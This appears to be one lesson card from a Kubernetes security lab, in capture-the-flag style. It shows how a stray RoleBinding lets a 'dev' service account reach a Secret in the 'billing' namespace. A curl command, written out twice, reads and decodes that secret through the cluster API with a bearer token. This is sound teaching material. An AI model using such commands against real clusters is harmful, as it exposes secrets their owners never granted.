---
kind: concept
ey: CONCEPT 5
eyt: Spending the grant
chip: {label: the payoff, tone: danger}
title: Follow the grant to the secret it was never meant to reach
aha: A permission you did not know you had is the most dangerous kind - nobody watches a door they forgot they left open.
diagram:
  caption: the stray grant reaches a secret in another namespace
  shapes:
    - {type: box, x: 50, y: 116, w: 180, h: 64, label: 'dev / app', sub: 'you', delay: 0}
    - {type: wire, from: {x: 230, y: 148}, to: {x: 360, y: 148}, tone: danger, delay: 0.4}
    - {type: box, x: 360, y: 116, w: 220, h: 64, label: 'billing / secret', sub: 'get allowed', tone: danger, delay: 0.7}
---
The grant is real, so spend it. Read the `Secret` in `billing` straight from the
API:

```
curl -s --cacert $CA -H "Authorization: Bearer $T" \
  $API/api/v1/namespaces/billing/secrets/revenue-report | jq -r '.data.flag' | base64 -d
```

Run it: `$ curl -s --cacert $CA -H "Authorization: Bearer $T" $API/api/v1/namespaces/billing/secrets/revenue-report | jq -r '.data.flag' | base64 -d`.

Secret values come back base64-encoded, so decode the `flag` field. What comes
out starts with `k8labs{`. A `Role` in `billing` had been bound to your `dev`
service account - one stray `RoleBinding` - and it reached across into data you
were never meant to see.
